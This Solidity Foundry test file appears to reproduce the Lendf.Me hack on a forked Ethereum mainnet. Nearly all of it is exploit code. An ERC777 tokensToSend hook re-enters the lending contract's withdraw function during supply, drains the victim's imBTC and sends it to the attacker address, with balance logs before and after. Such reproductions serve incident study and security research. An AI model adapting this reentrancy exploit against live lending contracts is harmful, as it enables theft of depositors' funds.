// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

/*
Lendf.Me Reentry Exploit PoC

See https://peckshield.medium.com/uniswap-lendf-me-hacks-root-cause-and-loss-analysis-50f3263dcc09 for more detail

Example tx - https://etherscan.io/tx/0xae7d664bdfcc54220df4f18d339005c6faf6e62c9ca79c56387bc0389274363b
*/

interface IMoneyMarket {
    function supply(address asset, uint amount) external returns (uint);

    function withdraw(
        address asset,
        uint requestedAmount
    ) external returns (uint);
}

contract LendfMeExploit is Test {
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    address bancorAddress = 0x5f58058C0eC971492166763c8C22632B583F667f;
    address victim = 0x0eEe3E3828A45f7601D5F54bF49bB01d1A9dF5ea;
    address attacker = 0xA9BF70A420d364e923C74448D9D817d3F2A77822;
    IERC20 imBTC = IERC20(0x3212b29E33587A00FB1C83346f5dBFA69A458923);
    IERC1820Registry internal erc1820 =
        IERC1820Registry(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24);
    bytes32 internal constant TOKENS_SENDER_INTERFACE_HASH =
        0x29ddb589b1fb5fc7cf394961c1adf5f8c6454761adf795e67fe149f658abe895;

    function setUp() public {
        cheats.createSelectFork("mainnet", 9899725);
    }

    function tokensToSend(
        address, // operator
        address, // from
        address, // to
        uint amount,
        bytes calldata, // userData
        bytes calldata // operatorData
    ) external {
        if (amount == 1) {
            IMoneyMarket(victim).withdraw(address(imBTC), type(uint).max);
        }
    }

    function testExploit() public {
        emit log_named_uint(
            "[Before Attack]Victim imBTC Balance : ",
            (imBTC.balanceOf(victim))
        );
        emit log_named_uint(
            "[Before Attack]Attacker imBTC Balance : ",
            (imBTC.balanceOf(attacker))
        );

        // prepare
        imBTC.approve(victim, type(uint256).max);
        erc1820.setInterfaceImplementer(
            address(this),
            TOKENS_SENDER_INTERFACE_HASH,
            address(this)
        );

        // move
        cheats.startPrank(attacker);
        imBTC.transfer(address(this), imBTC.balanceOf(attacker));
        cheats.stopPrank();

        // attack
        uint this_balance = imBTC.balanceOf(address(this));
        uint victim_balance = imBTC.balanceOf(victim);
        if (this_balance > (victim_balance + 1)) {
            this_balance = victim_balance + 1;
        }
        IMoneyMarket(victim).supply(address(imBTC), this_balance - 1);
        IMoneyMarket(victim).supply(address(imBTC), 1);
        IMoneyMarket(victim).withdraw(address(imBTC), type(uint).max);

        // transfer benefit back to the attacker
        IERC20(imBTC).transfer(
            attacker,
            IERC20(imBTC).balanceOf(address(this))
        );

        emit log_string(
            "--------------------------------------------------------------"
        );
        emit log_named_uint(
            "[After Attack]Victim imBTC Balance : ",
            (imBTC.balanceOf(victim))
        );
        emit log_named_uint(
            "[After Attack]Attacker imBTC Balance : ",
            (imBTC.balanceOf(attacker))
        );
    }
}
